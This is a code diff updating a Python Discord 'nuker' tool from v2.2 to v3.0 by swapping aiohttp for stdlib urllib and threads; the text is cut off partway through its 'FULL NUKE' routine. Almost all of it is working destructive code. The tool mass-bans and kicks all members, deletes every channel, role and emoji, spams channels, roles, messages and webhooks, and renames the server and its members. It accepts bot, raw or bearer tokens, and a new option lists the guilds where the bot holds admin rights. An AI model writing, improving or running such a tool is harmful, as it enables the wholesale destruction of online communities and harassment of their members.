@@ -1,9 +1,7 @@
 # nxr_nuker_protocol.py
-# NXR NUKER PROTOCOL v2.2
-# Python 3.10+ | pip install aiohttp colorama pyyaml
+# NXR NUKER PROTOCOL v3.0 (stdlib-only, small exe)
+# Python 3.10+ | no pip installs needed
 
-import asyncio
-import aiohttp
 import json
 import os
 import re
@@ -12,23 +10,22 @@ import time
 import random
 import traceback
 import unicodedata
-from pathlib import Path
+import threading
+import urllib.request
+import urllib.error
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-from colorama import init as cinit
-cinit(autoreset=True)
-
-try:
-    import yaml
-except ImportError:
-    yaml = None
-
+# enable ANSI colors on windows
 if os.name == "nt":
     os.system("")
 
 API = "https://discord.com/api/v10"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 
-DEFAULT_CONFIG = {
+# ---------------------------------------------------------------
+# CONFIG
+# ---------------------------------------------------------------
+CFG = {
     "reason": "NXR",
     "concurrency": 6,
     "fetch_member_limit": 1000,
@@ -57,40 +54,16 @@ DEFAULT_CONFIG = {
     "truecolor": True,
 }
 
-
-def _load_yaml_overrides():
-    if yaml is None:
-        return {}
-    base = Path(getattr(sys, "frozen", False) and Path(sys.executable).parent or Path(__file__).parent)
-    p = base / "config.yml"
-    if not p.exists():
-        return {}
-    try:
-        with open(p, "r", encoding="utf-8") as f:
-            loaded = yaml.safe_load(f) or {}
-        flat = {}
-        for k, v in loaded.items():
-            if isinstance(v, dict):
-                flat.update(v)
-            else:
-                flat[k] = v
-        return flat
-    except Exception:
-        return {}
-
-
-CFG = {**DEFAULT_CONFIG, **_load_yaml_overrides()}
 C = lambda k: CFG[k]  # noqa: E731
 
-TRUECOLOR = bool(CFG.get("truecolor", True))
-
-
+# ---------------------------------------------------------------
+# COLORS
+# ---------------------------------------------------------------
 def rgb(c, fb=37):
-    if not TRUECOLOR:
+    if not CFG.get("truecolor", True):
         return f"\x1b[{fb}m"
     r, g, b = c
     return f"\x1b[38;2;{r};{g};{b}m"
-
 
 RESET = "\x1b[0m"
 BOLD = "\x1b[1m"
@@ -110,7 +83,7 @@ def _lerp(a, b, t):
 def grad(text, start=None, end=None):
     start = start or tuple(CFG["gradient_start"])
     end = end or tuple(CFG["gradient_end"])
-    if not TRUECOLOR:
+    if not CFG.get("truecolor", True):
         return C_ACCENT + text + RESET
     chars = list(text)
     n = max(1, len(chars) - 1)
@@ -139,7 +112,7 @@ def banner():
     for line in BANNER_ART:
         print(grad(line))
     sub = "N X R   N U K E R   P R O T O C O L"
-    tag = "[ v2.2 - full protocol ]"
+    tag = "[ v3.0 - full protocol ]"
     pad = " " * max(0, (len(BANNER_ART[0]) - len(sub)) // 2)
     print()
     print(pad + grad(sub))
@@ -173,68 +146,40 @@ def pause(msg="press ENTER to exit"):
 
 
 # ---------------------------------------------------------------
-# TOKEN / ID CLEANUP
+# TOKEN CLEANUP / DIAGNOSIS
 # ---------------------------------------------------------------
 def _clean(s):
-    """strip everything that isn't a printable ascii char, collapse whitespace"""
     if s is None:
         return ""
     s = unicodedata.normalize("NFKC", s)
-    # replace curly quotes and similar lookalikes
     s = s.replace("\u201c", "").replace("\u201d", "")
     s = s.replace("\u2018", "").replace("\u2019", "")
-    s = s.replace("\u2013", "-").replace("\u2014", "-")
-    # kill BOM, zero-width, and any non-printable
     s = "".join(ch for ch in s if ch.isprintable() or ch in " \t")
-    # collapse internal whitespace to nothing (tokens never contain spaces)
     s = re.sub(r"\s+", "", s)
     return s.strip().strip('"').strip("'")
 
 
 def _diagnose_token(raw):
-    """
-    Look at the raw string and guess which common mistake it is.
-    Returns (cleaned_token, kind, hint).
-    kind in {bot, user, bad_id, bad_secret, bad_public_key, bad_short, bad_chars, empty}
-    """
     s = _clean(raw)
-
     if not s:
         return s, "empty", "you didn't enter anything"
-
     low = s.lower()
     if low.startswith("bot"):
         s = s[3:].lstrip()
     elif low.startswith("bearer"):
         s = s[6:].lstrip()
-
-    # client id / application id: pure digits, 17-20 long
     if re.fullmatch(r"\d{17,20}", s):
         return s, "bad_id", "that's the Application/Client ID, not the bot token"
-
-    # client secret: 32 chars, usually alnum
     if re.fullmatch(r"[A-Za-z0-9_\-]{30,36}", s) and "." not in s:
-        return s, "bad_secret", "that looks like a Client Secret, not the bot token"
-
-    # public key: 64 hex chars
+        return s, "bad_secret", "that looks like a Client Secret"
     if re.fullmatch(r"[0-9a-fA-F]{64}", s):
-        return s, "bad_public_key", "that's the Public Key from General Information, not the token"
-
-    # user token: JWT with 2 dots
-    if s.count(".") == 2 and len(s) > 60 and not s.split(".")[0].startswith("M"):
-        # real user tokens start with M or N; JWT format is xxxx.yyyy.zzzz
-        pass
-
-    # bot token: exactly 2 dots, three base64-ish parts
+        return s, "bad_public_key", "that's the Public Key"
     if s.count(".") == 2:
         parts = s.split(".")
-        # first part is base64 of the bot's user id
         if len(parts[0]) >= 20 and len(parts[1]) >= 5 and len(parts[2]) >= 20:
             return s, "bot", ""
-
     if len(s) < 50:
-        return s, "bad_short", f"token is only {len(s)} chars — bot tokens are ~70+ chars"
-
+        return s, "bad_short", f"token is only {len(s)} chars — bot tokens are ~70+"
     return s, "bad_chars", "unrecognized token shape"
 
 
@@ -250,11 +195,60 @@ def _extract_guild_id(raw):
     return digits[0] if digits else s
 
 
-async def _probe_token(session, cleaned):
-    """
-    Try the token in every format Discord accepts.
-    Returns (working_auth_header, label, user_dict) or (None, None, last_error).
-    """
+# ---------------------------------------------------------------
+# HTTP (stdlib urllib)
+# ---------------------------------------------------------------
+class Discord:
+    def __init__(self, auth_header):
+        self.auth = auth_header
+        self.headers = {
+            "Authorization": auth_header,
+            "User-Agent": UA,
+            "Content-Type": "application/json",
+        }
+        self._lock = threading.Lock()
+
+    def request(self, method, path, body=None, retries=5):
+        url = f"{API}{path}"
+        last = {"error": "unknown"}
+        for attempt in range(retries):
+            req = urllib.request.Request(url, method=method, headers=self.headers)
+            if body is not None:
+                req.data = body.encode("utf-8") if isinstance(body, str) else body
+            try:
+                with urllib.request.urlopen(req, timeout=30) as resp:
+                    raw = resp.read().decode("utf-8", errors="replace")
+                    try:
+                        return json.loads(raw) if raw else {}
+                    except Exception:
+                        return {}
+            except urllib.error.HTTPError as e:
+                code = e.code
+                body_text = ""
+                try:
+                    body_text = e.read().decode("utf-8", errors="replace")
+                except Exception:
+                    pass
+                if code == 429:
+                    try:
+                        data = json.loads(body_text)
+                        wait = float(data.get("retry_after", 2))
+                    except Exception:
+                        wait = 2.0
+                    time.sleep(wait + 0.2)
+                    continue
+                last = {"error": code, "text": body_text}
+                if code in (401, 403, 404):
+                    return last
+                time.sleep(1)
+            except Exception as e:
+                last = {"error": "exception", "text": f"{type(e).__name__}: {e}"}
+                time.sleep(1)
+        return last
+
+
+def probe_token(cleaned):
+    """Try Bot/raw/Bearer formats. Returns (working_auth, label, user_dict)."""
     base = cleaned
     low = base.lower()
     if low.startswith("bot"):
@@ -263,31 +257,28 @@ async def _probe_token(session, cleaned):
         base = base[6:].lstrip()
 
     attempts = [
-        ("Bot " + base,        "Bot <token>"),
-        (base,                 "raw <token>"),
-        ("Bearer " + base,     "Bearer <token>"),
+        ("Bot " + base, "Bot <token>"),
+        (base, "raw <token>"),
+        ("Bearer " + base, "Bearer <token>"),
     ]
 
     last_status = None
     last_body = ""
 
     for auth, label in attempts:
+        headers = {"Authorization": auth, "User-Agent": UA}
+        req = urllib.request.Request(f"{API}/users/@me", headers=headers)
         try:
-            headers = {
-                "Authorization": auth,
-                "User-Agent": UA,
-            }
-            async with session.get(f"{API}/users/@me", headers=headers) as r:
-                if r.status == 200:
-                    return auth, label, await r.json()
-                last_status = r.status
-                try:
-                    last_body = await r.text()
-                except Exception:
-                    last_body = ""
-                # 401 means format was wrong; try next variant
-                if r.status != 401:
-                    break
+            with urllib.request.urlopen(req, timeout=20) as resp:
+                return auth, label, json.loads(resp.read().decode("utf-8"))
+        except urllib.error.HTTPError as e:
+            last_status = e.code
+            try:
+                last_body = e.read().decode("utf-8", errors="replace")
+            except Exception:
+                last_body = ""
+            if e.code != 401:
+                break
         except Exception as e:
             last_status = "exception"
             last_body = f"{type(e).__name__}: {e}"
@@ -296,77 +287,40 @@ async def _probe_token(session, cleaned):
 
 
 # ---------------------------------------------------------------
-# CORE
+# NUKER
 # ---------------------------------------------------------------
 class NXRNuker:
     def __init__(self, auth_header, guild_id):
+        self.d = Discord(auth_header)
         self.guild_id = str(guild_id).strip()
-        self.headers = {
-            "Authorization": auth_header,
-            "User-Agent": UA,
-            "Content-Type": "application/json",
-        }
-        self.session = None
+        self.me = None
 
-    async def __aenter__(self):
-        self.session = aiohttp.ClientSession(headers=self.headers)
-        return self
-
-    async def __aexit__(self, *a):
-        await self.session.close()
-
-    async def _req(self, method, path, **kwargs):
-        url = f"{API}{path}"
-        last_err = {"error": "unknown"}
-        for _ in range(5):
-            try:
-                async with self.session.request(method, url, **kwargs) as r:
-                    if r.status == 429:
-                        try:
-                            data = await r.json()
-                        except Exception:
-                            data = {}
-                        await asyncio.sleep(float(data.get("retry_after", 2)) + 0.2)
-                        continue
-                    if r.status in (200, 201, 204):
-                        try:
-                            return await r.json()
-                        except Exception:
-                            return {}
-                    body = ""
-                    try:
-                        body = await r.text()
-                    except Exception:
-                        pass
-                    last_err = {"error": r.status, "text": body}
-                    if r.status in (401, 403, 404):
-                        return last_err
-                    await asyncio.sleep(1)
-            except Exception as e:
-                last_err = {"error": "exception", "text": f"{type(e).__name__}: {e}"}
-                await asyncio.sleep(1)
-        return last_err
-
-    async def fetch_guild(self):
-        return await self._req("GET", f"/guilds/{self.guild_id}?with_counts=true")
-
-    async def fetch_channels(self):
-        r = await self._req("GET", f"/guilds/{self.guild_id}/channels")
+    # -- recon ---------------------------------------------------
+    def my_guilds(self):
+        r = self.d.request("GET", "/users/@me/guilds")
         return r if isinstance(r, list) else []
 
-    async def fetch_roles(self):
-        r = await self._req("GET", f"/guilds/{self.guild_id}/roles")
+    def fetch_guild(self):
+        return self.d.request("GET", f"/guilds/{self.guild_id}?with_counts=true")
+
+    def fetch_channels(self):
+        r = self.d.request("GET", f"/guilds/{self.guild_id}/channels")
         return r if isinstance(r, list) else []
 
-    async def fetch_emojis(self):
-        r = await self._req("GET", f"/guilds/{self.guild_id}/emojis")
+    def fetch_roles(self):
+        r = self.d.request("GET", f"/guilds/{self.guild_id}/roles")
         return r if isinstance(r, list) else []
 
-    async def fetch_members(self, limit=1000):
+    def fetch_emojis(self):
+        r = self.d.request("GET", f"/guilds/{self.guild_id}/emojis")
+        return r if isinstance(r, list) else []
+
+    def fetch_members(self, limit=1000):
         members, after = [], "0"
         while len(members) < limit:
-            batch = await self._req(
-                "GET", f"/guilds/{self.guild_id}/members?limit=1000&after={after}"
+            batch = self.d.request(
+                "GET",
+                f"/guilds/{self.guild_id}/members?limit=1000&after={after}",
             )
             if not isinstance(batch, list) or not batch:
                 break
@@ -374,233 +328,282 @@ class NXRNuker:
             after = batch[-1]["user"]["id"]
             if len(batch) < 1000:
                 break
-            await asyncio.sleep(0.5)
+            time.sleep(0.5)
         return members
 
-    async def ban_member(self, uid, reason, dd=0):
-        return await self._req(
+    # -- threads helper ------------------------------------------
+    def _map(self, items, fn, conc, label=None):
+        ok = fail = 0
+        lock = threading.Lock()
+
+        def worker(x):
+            nonlocal ok, fail
+            try:
+                r = fn(x)
+                with lock:
+                    if isinstance(r, dict) and "error" in r:
+                        fail += 1
+                    else:
+                        ok += 1
+                        if label:
+                            log(label, str(x)[:60], C_OK)
+            except Exception:
+                with lock:
+                    fail += 1
+
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, items))
+        return ok, fail
+
+    # -- bans ----------------------------------------------------
+    def _ban_one(self, m, reason, dd):
+        uid = m["user"]["id"]
+        r = self.d.request(
             "PUT", f"/guilds/{self.guild_id}/bans/{uid}",
-            data=json.dumps({
+            body=json.dumps({
                 "delete_message_seconds": dd * 86400,
                 "reason": reason,
             }),
         )
+        if "error" not in r:
+            log("BAN", m["user"].get("username", "?"), C_ERR)
+        return r
 
-    async def ban_all(self, members, reason, dd, conc):
-        sem = asyncio.Semaphore(conc)
+    def ban_all(self, members, reason, dd, conc):
+        sem = threading.Semaphore(conc)
         ok = fail = 0
+        lock = threading.Lock()
 
-        async def w(m):
+        def worker(m):
             nonlocal ok, fail
-            async with sem:
-                r = await self.ban_member(m["user"]["id"], reason, dd)
-                if "error" in r:
-                    fail += 1
-                else:
-                    ok += 1
-                    log("BAN", m["user"].get("username", "?"), C_ERR)
+            with sem:
+                r = self._ban_one(m, reason, dd)
+                with lock:
+                    if "error" in r:
+                        fail += 1
+                    else:
+                        ok += 1
 
-        await asyncio.gather(*(w(m) for m in members))
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, members))
         return ok, fail
 
-    async def kick_member(self, uid, reason):
-        return await self._req(
-            "DELETE", f"/guilds/{self.guild_id}/members/{uid}",
-            data=json.dumps({"reason": reason}),
+    # -- kicks ---------------------------------------------------
+    def _kick_one(self, m, reason):
+        r = self.d.request(
+            "DELETE", f"/guilds/{self.guild_id}/members/{m['user']['id']}",
+            body=json.dumps({"reason": reason}),
         )
+        if "error" not in r:
+            log("KICK", m["user"].get("username", "?"), C_WARN)
+        return r
 
-    async def kick_all(self, members, reason, conc):
-        sem = asyncio.Semaphore(conc)
+    def kick_all(self, members, reason, conc):
+        sem = threading.Semaphore(conc)
         ok = 0
+        lock = threading.Lock()
 
-        async def w(m):
+        def worker(m):
             nonlocal ok
-            async with sem:
-                r = await self.kick_member(m["user"]["id"], reason)
-                if "error" not in r:
-                    ok += 1
-                    log("KICK", m["user"].get("username", "?"), C_WARN)
+            with sem:
+                r = self._kick_one(m, reason)
+                with lock:
+                    if "error" not in r:
+                        ok += 1
 
-        await asyncio.gather(*(w(m) for m in members))
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, members))
         return ok
 
-    async def delete_channel(self, cid):
-        return await self._req("DELETE", f"/channels/{cid}")
+    # -- channels ------------------------------------------------
+    def _del_channel(self, c):
+        r = self.d.request("DELETE", f"/channels/{c['id']}")
+        if "error" not in r:
+            log("DEL", f"#{c.get('name','?')}", C_ACCENT)
+        return r
 
-    async def delete_all_channels(self, channels, conc):
-        sem = asyncio.Semaphore(conc)
-        ok = 0
-
-        async def w(c):
-            nonlocal ok
-            async with sem:
-                r = await self.delete_channel(c["id"])
-                if "error" not in r:
-                    ok += 1
-                    log("DEL", f"#{c.get('name','?')}", C_ACCENT)
-
-        await asyncio.gather(*(w(c) for c in channels))
+    def delete_all_channels(self, channels, conc):
+        ok, fail = self._map(channels, self._del_channel, conc)
         return ok
 
-    async def create_channel(self, name, ctype=0):
-        return await self._req(
+    def _make_channel(self, name, ctype):
+        return self.d.request(
             "POST", f"/guilds/{self.guild_id}/channels",
-            data=json.dumps({"name": name, "type": ctype}),
+            body=json.dumps({"name": name, "type": ctype}),
         )
 
-    async def spam_channels(self, name, amount, ctype, conc):
-        sem = asyncio.Semaphore(conc)
-
-        async def w(i):
-            async with sem:
+    def spam_channels(self, name, amount, ctype, conc):
+        sem = threading.Semaphore(conc)
+        def worker(i):
+            with sem:
                 n = f"{name}-{i}" if amount > 1 else name
-                r = await self.create_channel(n, ctype)
+                r = self._make_channel(n, ctype)
                 if "error" not in r:
                     log("MAKE", n, C_OK)
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, range(amount)))
 
-        await asyncio.gather(*(w(i) for i in range(amount)))
+    # -- roles ---------------------------------------------------
+    def _del_role(self, r):
+        if r.get("managed") or r["name"] == "@everyone":
+            return {"skip": True}
+        res = self.d.request("DELETE", f"/guilds/{self.guild_id}/roles/{r['id']}")
+        if "error" not in res:
+            log("ROLE-", r["name"], C_ACCENT)
+        return res
 
-    async def delete_role(self, rid):
-        return await self._req("DELETE", f"/guilds/{self.guild_id}/roles/{rid}")
-
-    async def delete_all_roles(self, roles, conc):
-        sem = asyncio.Semaphore(conc)
+    def delete_all_roles(self, roles, conc):
+        sem = threading.Semaphore(conc)
         ok = 0
+        lock = threading.Lock()
 
-        async def w(r):
+        def worker(r):
             nonlocal ok
-            if r.get("managed") or r["name"] == "@everyone":
-                return
-            async with sem:
-                res = await self.delete_role(r["id"])
-                if "error" not in res:
-                    ok += 1
-                    log("ROLE-", r["name"], C_ACCENT)
+            with sem:
+                if r.get("managed") or r["name"] == "@everyone":
+                    return
+                res = self.d.request("DELETE", f"/guilds/{self.guild_id}/roles/{r['id']}")
+                with lock:
+                    if "error" not in res:
+                        ok += 1
+                        log("ROLE-", r["name"], C_ACCENT)
 
-        await asyncio.gather(*(w(r) for r in roles))
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, roles))
         return ok
 
-    async def create_role(self, name, color=0, hoist=False, mentionable=False):
-        return await self._req(
+    def _make_role(self, name, color):
+        return self.d.request(
             "POST", f"/guilds/{self.guild_id}/roles",
-            data=json.dumps({
-                "name": name, "color": color,
-                "hoist": hoist, "mentionable": mentionable,
-            }),
+            body=json.dumps({"name": name, "color": color}),
         )
 
-    async def spam_roles(self, name, amount, color, conc=3):
-        sem = asyncio.Semaphore(conc)
-
-        async def w(i):
-            async with sem:
+    def spam_roles(self, name, amount, color, conc=3):
+        sem = threading.Semaphore(conc)
+        def worker(i):
+            with sem:
                 n = f"{name}-{i}" if amount > 1 else name
-                r = await self.create_role(n, color)
+                r = self._make_role(n, color)
                 if "error" not in r:
                     log("ROLE+", n, C_OK)
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, range(amount)))
 
-        await asyncio.gather(*(w(i) for i in range(amount)))
-
-    async def send_message(self, cid, content):
-        return await self._req(
+    # -- messages ------------------------------------------------
+    def send_message(self, cid, content):
+        return self.d.request(
             "POST", f"/channels/{cid}/messages",
-            data=json.dumps({"content": content}),
+            body=json.dumps({"content": content}),
         )
 
-    async def spam_messages(self, cid, content, amount, delay=0.0):
+    def spam_messages(self, cid, content, amount, delay=0.0):
         sent = 0
         for _ in range(amount):
-            r = await self.send_message(cid, content)
+            r = self.send_message(cid, content)
             if "error" not in r:
                 sent += 1
             if delay:
-                await asyncio.sleep(delay)
+                time.sleep(delay)
         log("MSG", f"{sent}/{amount} -> {cid}", C_OK)
         return sent
 
-    async def spam_all_channels(self, channels, content, amount, delay):
+    def spam_all_channels(self, channels, content, amount, delay):
         text = [c for c in channels if c.get("type") == 0]
         for t in text:
-            await self.spam_messages(t["id"], content, amount, delay)
+            self.spam_messages(t["id"], content, amount, delay)
 
-    async def slowmode_channel(self, cid, seconds):
-        return await self._req(
+    # -- slowmode ------------------------------------------------
+    def _slowmode(self, cid, seconds):
+        return self.d.request(
             "PATCH", f"/channels/{cid}",
-            data=json.dumps({"rate_limit_per_user": seconds}),
+            body=json.dumps({"rate_limit_per_user": seconds}),
         )
 
-    async def slowmode_all(self, channels, seconds, conc=5):
-        sem = asyncio.Semaphore(conc)
+    def slowmode_all(self, channels, seconds, conc=5):
+        sem = threading.Semaphore(conc)
         ok = 0
+        lock = threading.Lock()
 
-        async def w(c):
+        def worker(c):
             nonlocal ok
             if c.get("type") != 0:
                 return
-            async with sem:
-                r = await self.slowmode_channel(c["id"], seconds)
-                if "error" not in r:
-                    ok += 1
+            with sem:
+                r = self._slowmode(c["id"], seconds)
+                with lock:
+                    if "error" not in r:
+                        ok += 1
 
-        await asyncio.gather(*(w(c) for c in channels))
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, channels))
         return ok
 
-    async def create_webhook(self, cid, name="NXR"):
-        return await self._req(
+    # -- webhooks ------------------------------------------------
+    def _make_hook(self, cid, name):
+        return self.d.request(
             "POST", f"/channels/{cid}/webhooks",
-            data=json.dumps({"name": name}),
+            body=json.dumps({"name": name}),
         )
 
-    async def spam_webhooks(self, channels, amount, conc=3):
+    def spam_webhooks(self, channels, amount, conc=3):
         text = [c for c in channels if c.get("type") == 0]
         if not text:
             return 0
-        sem = asyncio.Semaphore(conc)
+        sem = threading.Semaphore(conc)
         ok = 0
+        lock = threading.Lock()
 
-        async def w(i):
+        def worker(i):
             nonlocal ok
-            async with sem:
+            with sem:
                 ch = random.choice(text)
-                r = await self.create_webhook(ch["id"], f"NXR-{i}")
-                if "error" not in r:
-                    ok += 1
-                    log("HOOK", f"NXR-{i}", C_OK)
+                r = self._make_hook(ch["id"], f"NXR-{i}")
+                with lock:
+                    if "error" not in r:
+                        ok += 1
+                        log("HOOK", f"NXR-{i}", C_OK)
 
-        await asyncio.gather(*(w(i) for i in range(amount)))
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, range(amount)))
         return ok
 
-    async def set_nick(self, uid, nick):
-        return await self._req(
+    # -- nicknames -----------------------------------------------
+    def _set_nick(self, uid, nick):
+        return self.d.request(
             "PATCH", f"/guilds/{self.guild_id}/members/{uid}",
-            data=json.dumps({"nick": nick}),
+            body=json.dumps({"nick": nick}),
         )
 
-    async def mass_nick(self, members, template, conc=5):
-        sem = asyncio.Semaphore(conc)
+    def mass_nick(self, members, template, conc=5):
+        sem = threading.Semaphore(conc)
         ok = 0
+        lock = threading.Lock()
 
-        async def w(i, m):
+        def worker(args):
             nonlocal ok
+            i, m = args
             nick = template.replace("{n}", str(i))
-            async with sem:
-                r = await self.set_nick(m["user"]["id"], nick)
-                if "error" not in r:
-                    ok += 1
+            with sem:
+                r = self._set_nick(m["user"]["id"], nick)
+                with lock:
+                    if "error" not in r:
+                        ok += 1
 
-        await asyncio.gather(*(w(i, m) for i, m in enumerate(members)))
+        with ThreadPoolExecutor(max_workers=conc) as ex:
+            list(ex.map(worker, enumerate(members)))
         log("NICK", f"{ok}/{len(members)} renamed", C_OK)
         return ok
 
-    async def rename_guild(self, name):
-        return await self._req(
+    # -- guild edit ----------------------------------------------
+    def rename_guild(self, name):
+        return self.d.request(
             "PATCH", f"/guilds/{self.guild_id}",
-            data=json.dumps({"name": name}),
+            body=json.dumps({"name": name}),
         )
 
-    async def delete_emojis(self, emojis):
+    def delete_emojis(self, emojis):
         for e in emojis:
-            await self._req("DELETE", f"/guilds/{self.guild_id}/emojis/{e['id']}")
+            self.d.request("DELETE", f"/guilds/{self.guild_id}/emojis/{e['id']}")
             log("EMOJI-", e.get("name", "?"), C_ACCENT)
 
 
@@ -633,7 +636,8 @@ def draw_menu():
         ("10", "Mass Nickname Change"),
         ("11", "Slowmode All Channels"),
         ("12", "Spam Webhooks"),
-        ("13", "FULL NUKE"),
+        ("13", "List My Bot's Guilds"),
+        ("14", "FULL NUKE"),
         ("0",  "Exit"),
     ]
     for k, label in items:
@@ -653,7 +657,7 @@ def header(txt):
 # ---------------------------------------------------------------
 # ACTIONS
 # ---------------------------------------------------------------
-async def act_ban(n):
+def act_ban(n):
     header("BAN ALL MEMBERS")
     reason = prompt("reason", C("reason"))
     try:
@@ -662,38 +666,38 @@ async def act_ban(n):
     except ValueError:
         dd, conc = 0, 6
     log("SCAN", "fetching members...", C_WARN)
-    members = await n.fetch_members(C("fetch_member_limit"))
+    members = n.fetch_members(C("fetch_member_limit"))
     log("SCAN", f"{len(members)} members", C_WARN)
-    ok, fail = await n.ban_all(members, reason, dd, conc)
+    ok, fail = n.ban_all(members, reason, dd, conc)
     log("DONE", f"banned {ok}  failed {fail}", C_OK)
 
 
-async def act_kick(n):
+def act_kick(n):
     header("KICK ALL MEMBERS")
     reason = prompt("reason", C("reason"))
     try:
         conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
     except ValueError:
         conc = 6
-    members = await n.fetch_members(C("fetch_member_limit"))
+    members = n.fetch_members(C("fetch_member_limit"))
     log("SCAN", f"{len(members)} members", C_WARN)
-    ok = await n.kick_all(members, reason, conc)
+    ok = n.kick_all(members, reason, conc)
     log("DONE", f"kicked {ok}", C_OK)
 
 
-async def act_del_chans(n):
+def act_del_chans(n):
     header("DELETE ALL CHANNELS")
     try:
         conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
     except ValueError:
         conc = 6
-    chans = await n.fetch_channels()
+    chans = n.fetch_channels()
     log("SCAN", f"{len(chans)} channels", C_WARN)
-    ok = await n.delete_all_channels(chans, conc)
+    ok = n.delete_all_channels(chans, conc)
     log("DONE", f"deleted {ok}", C_OK)
 
 
-async def act_spam_chans(n):
+def act_spam_chans(n):
     header("SPAM CHANNELS")
     name = prompt("channel name", C("spam_channel_name"))
     try:
@@ -702,22 +706,22 @@ async def act_spam_chans(n):
         conc = int(prompt("concurrency", str(C("spam_channel_concurrency"))) or 3)
     except ValueError:
         amt, ctype, conc = 50, 0, 3
-    await n.spam_channels(name, amt, ctype, conc)
+    n.spam_channels(name, amt, ctype, conc)
     log("DONE", "channel spam complete", C_OK)
 
 
-async def act_del_roles(n):
+def act_del_roles(n):
     header("DELETE ALL ROLES")
     try:
         conc = int(prompt("concurrency", str(C("concurrency"))) or 6)
     except ValueError:
         conc = 6
-    roles = await n.fetch_roles()
-    ok = await n.delete_all_roles(roles, conc)
+    roles = n.fetch_roles()
+    ok = n.delete_all_roles(roles, conc)
     log("DONE", f"deleted {ok} roles", C_OK)
 
 
-async def act_spam_roles(n):
+def act_spam_roles(n):
     header("SPAM ROLES")
     name = prompt("role name", C("spam_role_name"))
     try:
@@ -725,13 +729,13 @@ async def act_spam_roles(n):
         col = int(prompt("color int (0 = none)", str(C("spam_role_color"))) or 0)
     except ValueError:
         amt, col = 50, 0
-    await n.spam_roles(name, amt, col)
+    n.spam_roles(name, amt, col)
     log("DONE", "role spam complete", C_OK)
 
 
-async def act_spam_msgs(n):
+def act_spam_msgs(n):
     header("SPAM MESSAGES")
-    chans = await n.fetch_channels()
+    chans = n.fetch_channels()
     text = [c for c in chans if c.get("type") == 0]
     print(f"  {C_MUTED}text channels: {len(text)}{RESET}")
     cid = prompt("channel id (or 'all')", "all")
@@ -742,65 +746,83 @@ async def act_spam_msgs(n):
     except ValueError:
         amt, delay = 10, 0.0
     if cid == "all":
-        await n.spam_all_channels(chans, content, amt, delay)
+        n.spam_all_channels(chans, content, amt, delay)
     else:
-        await n.spam_messages(cid, content, amt, delay)
+        n.spam_messages(cid, content, amt, delay)
     log("DONE", "message spam complete", C_OK)
 
 
-async def act_rename(n):
+def act_rename(n):
     header("RENAME GUILD")
     name = prompt("new guild name", C("guild_rename"))
-    await n.rename_guild(name)
+    n.rename_guild(name)
     log("DONE", f"renamed -> {name}", C_OK)
 
 
-async def act_del_emojis(n):
+def act_del_emojis(n):
     header("DELETE ALL EMOJIS")
-    emojis = await n.fetch_emojis()
+    emojis = n.fetch_emojis()
     log("SCAN", f"{len(emojis)} emojis", C_WARN)
     if emojis:
-        await n.delete_emojis(emojis)
+        n.delete_emojis(emojis)
     log("DONE", "emojis cleared", C_OK)
 
 
-async def act_nick(n):
+def act_nick(n):
     header("MASS NICKNAME CHANGE")
     tmpl = prompt("nick template ({n} = index)", C("nick_template"))
     try:
         conc = int(prompt("concurrency", "5") or 5)
     except ValueError:
         conc = 5
-    members = await n.fetch_members(C("fetch_member_limit"))
+    members = n.fetch_members(C("fetch_member_limit"))
     log("SCAN", f"{len(members)} members", C_WARN)
-    await n.mass_nick(members, tmpl, conc)
+    n.mass_nick(members, tmpl, conc)
 
 
-async def act_slowmode(n):
+def act_slowmode(n):
     header("SLOWMODE ALL CHANNELS")
     try:
         sec = int(prompt("slowmode seconds", str(C("slowmode_seconds"))) or 21600)
         conc = int(prompt("concurrency", "5") or 5)
     except ValueError:
         sec, conc = 21600, 5
-    chans = await n.fetch_channels()
-    ok = await n.slowmode_all(chans, sec, conc)
+    chans = n.fetch_channels()
+    ok = n.slowmode_all(chans, sec, conc)
     log("DONE", f"{ok} channels set to {sec}s", C_OK)
 
 
-async def act_webhooks(n):
+def act_webhooks(n):
     header("SPAM WEBHOOKS")
     try:
         amt = int(prompt("amount", str(C("spam_webhook_amount"))) or 10)
         conc = int(prompt("concurrency", "3") or 3)
     except ValueError:
         amt, conc = 10, 3
-    chans = await n.fetch_channels()
-    ok = await n.spam_webhooks(chans, amt, conc)
+    chans = n.fetch_channels()
+    ok = n.spam_webhooks(chans, amt, conc)
     log("DONE", f"created {ok} webhooks", C_OK)
 
 
-async def act_full_nuke(n):
+def act_list_guilds(n):
+    header("MY BOT'S GUILDS")
+    gs = n.my_guilds()
+    if not gs:
+        log("ERR", "bot is not in any guilds — invite it first", C_ERR)
+        return
+    print(f"  {C_MUTED}bot is in {len(gs)} guild(s):{RESET}")
+    print()
+    for g in gs:
+        gid = g.get("id", "?")
+        name = g.get("name", "?")
+        perms = int(g.get("permissions", 0))
+        admin = "ADMIN" if perms & 0x8 else "     "
+        print(f"  {C_ACCENT}{gid}{RESET}  {C_MUTED}{admin}{RESET}  {name}")
+    print()
+    log("HINT", "copy the id above and re-run the tool with it", C_WARN)
+
+
+def act_full_nuke(n):
     header("FULL NUKE")
     reason = prompt("ban reason", C("reason"))
     try:
@@ -808,22 +830,30 @@ async def act_full_nuke(n):
     except ValueError:
         conc = 6
     log("NUKE", "recon...", C_ERR)
-    members, chans, roles = await asyncio.gather(
-        n.fetch_members(C("fetch_member_limit")),
-        n.fetch_channels(),
-        n.fetch_roles(),
-    )
+    members = n.fetch_members(C("fetch_member_limit"))
+    chans = n.fetch_channels()
+    roles = n.fetch_roles()
     log("NUKE", f"{len(members)}M  {len(chans)}C  {len(roles)}R", C_ERR)
 
-    await asyncio.gather(
-        n.ban_all(members, reason, C("ban_delete_days"), conc),
-        n.delete_all_channels(chans, conc),
-        n.delete_all_roles(roles, conc),
-    )
-    await n.rename_guild(C("guild_rename"))
